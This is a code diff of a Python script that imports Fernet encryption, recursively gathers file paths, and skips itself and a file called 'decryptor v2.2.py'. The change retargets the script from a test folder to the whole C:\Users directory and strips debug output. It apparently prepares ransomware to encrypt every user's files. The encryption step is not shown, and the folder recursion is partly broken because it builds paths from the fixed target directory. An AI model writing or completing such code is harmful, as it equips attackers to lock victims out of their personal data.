@@ -2,21 +2,21 @@ import os
 from cryptography.fernet import Fernet
 import sys
 
-target_dir=r"C:\Users\Arthu\Documents\python\face\other\packets\target_3"
+target_dir=r"C:\Users"
 def parse(directory_to_parse):
     global files_found, target_dir
     for file_name in os.listdir(directory_to_parse):
         path = os.path.join(directory_to_parse, file_name)
         if file_name == str(sys.argv[0]) or file_name == "decryptor v2.2.py":
             continue
-        print(f"before isfile: file name {file_name}")
+        
         if os.path.isfile(path):
             files.append(path)
             print('-' * 80)
             print(f"[{file_name}]--file found")
             files_found+=1
         else:
-            print(f"test- found directory {path}")
+            print(f"found directory {path}")
             print(f"folder NAME:{file_name}")
             found_folder=f"{target_dir}" + "/" + f"{file_name}"
             parse(found_folder)
